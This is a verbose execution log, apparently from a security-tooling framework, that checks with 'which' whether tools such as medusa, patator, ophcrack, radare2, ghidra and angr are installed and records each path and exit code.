2025-10-24 01:26:45,208 - __main__ - INFO - 🆔 PROCESS: PID 43143 started
2025-10-24 01:26:45,208 - __main__ - INFO - 🆔 REGISTERED: Process 43143 - which jwt-analyzer...
2025-10-24 01:26:45,209 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43143
2025-10-24 01:26:45,212 - __main__ - INFO - 🧹 CLEANUP: Process 43143 removed from registry
2025-10-24 01:26:45,212 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:45,212 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,212 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,212 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,212 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jwt-analyzer
2025-10-24 01:26:45,212 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,212 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,212 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,212 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,212 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,212 - __main__ - INFO - 🔍 Cache MISS for command: which medusa
2025-10-24 01:26:45,212 - __main__ - INFO - 🚀 EXECUTING: which medusa
2025-10-24 01:26:45,212 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,213 - __main__ - INFO - 🆔 PROCESS: PID 43148 started
2025-10-24 01:26:45,213 - __main__ - INFO - 🆔 REGISTERED: Process 43148 - which medusa...
2025-10-24 01:26:45,213 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43148
2025-10-24 01:26:45,215 - __main__ - INFO - 📤 STDOUT: /usr/bin/medusa
2025-10-24 01:26:45,217 - __main__ - INFO - 🧹 CLEANUP: Process 43148 removed from registry
2025-10-24 01:26:45,217 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,217 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,217 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,217 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,217 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which medusa
2025-10-24 01:26:45,217 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,217 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,217 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,217 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,217 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,217 - __main__ - INFO - 💾 Cached result for command: which medusa
2025-10-24 01:26:45,217 - __main__ - INFO - 🔍 Cache MISS for command: which patator
2025-10-24 01:26:45,217 - __main__ - INFO - 🚀 EXECUTING: which patator
2025-10-24 01:26:45,217 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,217 - __main__ - INFO - 🆔 PROCESS: PID 43153 started
2025-10-24 01:26:45,217 - __main__ - INFO - 🆔 REGISTERED: Process 43153 - which patator...
2025-10-24 01:26:45,221 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43153
2025-10-24 01:26:45,225 - __main__ - INFO - 📤 STDOUT: /usr/bin/patator
2025-10-24 01:26:45,227 - __main__ - INFO - 🧹 CLEANUP: Process 43153 removed from registry
2025-10-24 01:26:45,227 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,227 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,227 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,227 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,227 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which patator
2025-10-24 01:26:45,227 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,227 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,227 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,227 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,227 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,227 - __main__ - INFO - 💾 Cached result for command: which patator
2025-10-24 01:26:45,227 - __main__ - INFO - 🔍 Cache MISS for command: which hash-identifier
2025-10-24 01:26:45,227 - __main__ - INFO - 🚀 EXECUTING: which hash-identifier
2025-10-24 01:26:45,227 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,228 - __main__ - INFO - 🆔 PROCESS: PID 43158 started
2025-10-24 01:26:45,228 - __main__ - INFO - 🆔 REGISTERED: Process 43158 - which hash-identifier...
2025-10-24 01:26:45,229 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43158
2025-10-24 01:26:45,230 - __main__ - INFO - 📤 STDOUT: /usr/bin/hash-identifier
2025-10-24 01:26:45,231 - __main__ - INFO - 🧹 CLEANUP: Process 43158 removed from registry
2025-10-24 01:26:45,231 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,231 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,231 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,231 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,231 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hash-identifier
2025-10-24 01:26:45,231 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,231 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 25 bytes
2025-10-24 01:26:45,231 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,231 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,231 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,231 - __main__ - INFO - 💾 Cached result for command: which hash-identifier
2025-10-24 01:26:45,231 - __main__ - INFO - 🔍 Cache MISS for command: which ophcrack
2025-10-24 01:26:45,231 - __main__ - INFO - 🚀 EXECUTING: which ophcrack
2025-10-24 01:26:45,231 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,231 - __main__ - INFO - 🆔 PROCESS: PID 43163 started
2025-10-24 01:26:45,231 - __main__ - INFO - 🆔 REGISTERED: Process 43163 - which ophcrack...
2025-10-24 01:26:45,233 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43163
2025-10-24 01:26:45,234 - __main__ - INFO - 📤 STDOUT: /usr/bin/ophcrack
2025-10-24 01:26:45,234 - __main__ - INFO - 🧹 CLEANUP: Process 43163 removed from registry
2025-10-24 01:26:45,234 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,234 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,234 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,234 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,234 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ophcrack
2025-10-24 01:26:45,234 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,234 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,234 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,234 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,234 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,234 - __main__ - INFO - 💾 Cached result for command: which ophcrack
2025-10-24 01:26:45,235 - __main__ - INFO - 🔍 Cache MISS for command: which gdb
2025-10-24 01:26:45,235 - __main__ - INFO - 🚀 EXECUTING: which gdb
2025-10-24 01:26:45,235 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,235 - __main__ - INFO - 🆔 PROCESS: PID 43168 started
2025-10-24 01:26:45,235 - __main__ - INFO - 🆔 REGISTERED: Process 43168 - which gdb...
2025-10-24 01:26:45,236 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43168
2025-10-24 01:26:45,238 - __main__ - INFO - 📤 STDOUT: /usr/bin/gdb
2025-10-24 01:26:45,238 - __main__ - INFO - 🧹 CLEANUP: Process 43168 removed from registry
2025-10-24 01:26:45,238 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,238 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,238 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,238 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,238 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which gdb
2025-10-24 01:26:45,238 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,238 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 13 bytes
2025-10-24 01:26:45,238 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,238 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,238 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,238 - __main__ - INFO - 💾 Cached result for command: which gdb
2025-10-24 01:26:45,238 - __main__ - INFO - 🔍 Cache MISS for command: which radare2
2025-10-24 01:26:45,238 - __main__ - INFO - 🚀 EXECUTING: which radare2
2025-10-24 01:26:45,238 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,239 - __main__ - INFO - 🆔 PROCESS: PID 43173 started
2025-10-24 01:26:45,239 - __main__ - INFO - 🆔 REGISTERED: Process 43173 - which radare2...
2025-10-24 01:26:45,239 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43173
2025-10-24 01:26:45,242 - __main__ - INFO - 📤 STDOUT: /usr/bin/radare2
2025-10-24 01:26:45,246 - __main__ - INFO - 🧹 CLEANUP: Process 43173 removed from registry
2025-10-24 01:26:45,246 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,246 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,246 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,246 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,246 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which radare2
2025-10-24 01:26:45,246 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,246 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,246 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,246 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,246 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,246 - __main__ - INFO - 💾 Cached result for command: which radare2
2025-10-24 01:26:45,246 - __main__ - INFO - 🔍 Cache MISS for command: which binwalk
2025-10-24 01:26:45,246 - __main__ - INFO - 🚀 EXECUTING: which binwalk
2025-10-24 01:26:45,246 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,246 - __main__ - INFO - 🆔 PROCESS: PID 43178 started
2025-10-24 01:26:45,246 - __main__ - INFO - 🆔 REGISTERED: Process 43178 - which binwalk...
2025-10-24 01:26:45,247 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43178
2025-10-24 01:26:45,250 - __main__ - INFO - 📤 STDOUT: /usr/bin/binwalk
2025-10-24 01:26:45,251 - __main__ - INFO - 🧹 CLEANUP: Process 43178 removed from registry
2025-10-24 01:26:45,251 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,252 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,252 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,252 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,252 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which binwalk
2025-10-24 01:26:45,252 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,252 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,252 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,252 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,252 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,252 - __main__ - INFO - 💾 Cached result for command: which binwalk
2025-10-24 01:26:45,252 - __main__ - INFO - 🔍 Cache MISS for command: which ropgadget
2025-10-24 01:26:45,252 - __main__ - INFO - 🚀 EXECUTING: which ropgadget
2025-10-24 01:26:45,252 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,252 - __main__ - INFO - 🆔 PROCESS: PID 43183 started
2025-10-24 01:26:45,252 - __main__ - INFO - 🆔 REGISTERED: Process 43183 - which ropgadget...
2025-10-24 01:26:45,254 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43183
2025-10-24 01:26:45,254 - __main__ - INFO - 📤 STDOUT: /usr/bin/ropgadget
2025-10-24 01:26:45,255 - __main__ - INFO - 🧹 CLEANUP: Process 43183 removed from registry
2025-10-24 01:26:45,255 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,255 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,256 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,256 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,256 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ropgadget
2025-10-24 01:26:45,256 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,256 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,256 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,256 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,256 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,256 - __main__ - INFO - 💾 Cached result for command: which ropgadget
2025-10-24 01:26:45,256 - __main__ - INFO - 🔍 Cache MISS for command: which checksec
2025-10-24 01:26:45,256 - __main__ - INFO - 🚀 EXECUTING: which checksec
2025-10-24 01:26:45,256 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,256 - __main__ - INFO - 🆔 PROCESS: PID 43188 started
2025-10-24 01:26:45,256 - __main__ - INFO - 🆔 REGISTERED: Process 43188 - which checksec...
2025-10-24 01:26:45,257 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43188
2025-10-24 01:26:45,259 - __main__ - INFO - 📤 STDOUT: /opt/hexstrike-ai/hexstrike-env/bin/checksec
2025-10-24 01:26:45,262 - __main__ - INFO - 🧹 CLEANUP: Process 43188 removed from registry
2025-10-24 01:26:45,262 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,262 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,262 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,262 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,262 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which checksec
2025-10-24 01:26:45,262 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,262 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 45 bytes
2025-10-24 01:26:45,262 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,262 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,262 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,262 - __main__ - INFO - 💾 Cached result for command: which checksec
2025-10-24 01:26:45,262 - __main__ - INFO - 🔍 Cache MISS for command: which objdump
2025-10-24 01:26:45,262 - __main__ - INFO - 🚀 EXECUTING: which objdump
2025-10-24 01:26:45,262 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,262 - __main__ - INFO - 🆔 PROCESS: PID 43193 started
2025-10-24 01:26:45,262 - __main__ - INFO - 🆔 REGISTERED: Process 43193 - which objdump...
2025-10-24 01:26:45,263 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43193
2025-10-24 01:26:45,265 - __main__ - INFO - 📤 STDOUT: /usr/bin/objdump
2025-10-24 01:26:45,267 - __main__ - INFO - 🧹 CLEANUP: Process 43193 removed from registry
2025-10-24 01:26:45,267 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,267 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,267 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,267 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,267 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which objdump
2025-10-24 01:26:45,267 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,267 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,267 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,267 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,267 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,267 - __main__ - INFO - 💾 Cached result for command: which objdump
2025-10-24 01:26:45,267 - __main__ - INFO - 🔍 Cache MISS for command: which ghidra
2025-10-24 01:26:45,267 - __main__ - INFO - 🚀 EXECUTING: which ghidra
2025-10-24 01:26:45,267 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,268 - __main__ - INFO - 🆔 PROCESS: PID 43198 started
2025-10-24 01:26:45,268 - __main__ - INFO - 🆔 REGISTERED: Process 43198 - which ghidra...
2025-10-24 01:26:45,269 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43198
2025-10-24 01:26:45,271 - __main__ - INFO - 📤 STDOUT: /usr/bin/ghidra
2025-10-24 01:26:45,273 - __main__ - INFO - 🧹 CLEANUP: Process 43198 removed from registry
2025-10-24 01:26:45,273 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,273 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,274 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,274 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,274 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ghidra
2025-10-24 01:26:45,274 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,274 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,274 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,274 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,274 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,274 - __main__ - INFO - 💾 Cached result for command: which ghidra
2025-10-24 01:26:45,275 - __main__ - INFO - 🔍 Cache MISS for command: which ropper
2025-10-24 01:26:45,275 - __main__ - INFO - 🚀 EXECUTING: which ropper
2025-10-24 01:26:45,275 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,276 - __main__ - INFO - 🆔 PROCESS: PID 43203 started
2025-10-24 01:26:45,276 - __main__ - INFO - 🆔 REGISTERED: Process 43203 - which ropper...
2025-10-24 01:26:45,277 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43203
2025-10-24 01:26:45,279 - __main__ - INFO - 📤 STDOUT: /usr/bin/ropper
2025-10-24 01:26:45,282 - __main__ - INFO - 🧹 CLEANUP: Process 43203 removed from registry
2025-10-24 01:26:45,282 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,282 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,282 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,282 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,282 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ropper
2025-10-24 01:26:45,282 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,282 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,282 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,282 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,282 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,282 - __main__ - INFO - 💾 Cached result for command: which ropper
2025-10-24 01:26:45,282 - __main__ - INFO - 🔍 Cache MISS for command: which angr
2025-10-24 01:26:45,282 - __main__ - INFO - 🚀 EXECUTING: which angr
2025-10-24 01:26:45,282 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,282 - __main__ - INFO - 🆔 PROCESS: PID 43208 started
2025-10-24 01:26:45,282 - __main__ - INFO - 🆔 REGISTERED: Process 43208 - which angr...
2025-10-24 01:26:45,283 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43208
2025-10-24 01:26:45,285 - __main__ - INFO - 📤 STDOUT: /opt/hexstrike-ai/hexstrike-env/bin/angr
2025-10-24 01:26:45,287 - __main__ - INFO - 🧹 CLEANUP: Process 43208 removed from registry
2025-10-24 01:26:45,287 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,287 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,287 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,287 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,287 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which angr
2025-10-24 01:26:45,287 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,287 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 41 bytes
2025-10-24 01:26:45,287 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,287 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,287 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,287 - __main__ - INFO - 💾 Cached result for command: which angr
